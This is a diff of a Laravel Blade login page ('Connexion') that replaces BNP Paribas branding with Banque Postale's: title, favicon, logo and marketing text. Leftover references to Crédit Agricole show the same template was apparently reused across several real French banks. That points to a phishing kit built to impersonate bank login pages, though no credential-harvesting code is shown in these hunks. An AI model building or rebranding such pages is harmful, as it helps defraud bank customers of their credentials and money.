@@ -5,10 +5,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
-    <title>BNP Paribas - Connexion</title>
+    <title>Banque Postale - Connexion</title>
     <!-- Ajoutez le script à l'intérieur de la balise <head> -->
         {{-- Favicon --}}
-    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('logo1.webp') }}">
+    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('banquepostale.png') }}">
     {{-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> --}}
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.css">
 
@@ -40,7 +40,7 @@
     </script>
 
     <nav class="navbar">
-        <img src="{{ asset('logo1.webp') }}" alt="Bnp paribas" >
+        <img src="{{ asset('banquepostale.png') }}" width="80" alt="Banque Postale" >
         <!-- <h2>Slogan de la banque</h2> -->
         <ul>
             {{-- <li><a href="https://www.credit-agricole.fr">Comptes & Cartes</a></li>
@@ -86,7 +86,7 @@
                 <h3>Téléchargez l’application Ma Banque
 
                     Chacun d’entre vous gère différemment ses besoins bancaires.
-                    Seul ou accompagné, au Bnp paribas, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
+                    Seul ou accompagné, à la Banque Postale, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
             </div>
         </div>
         <div class="right-section">
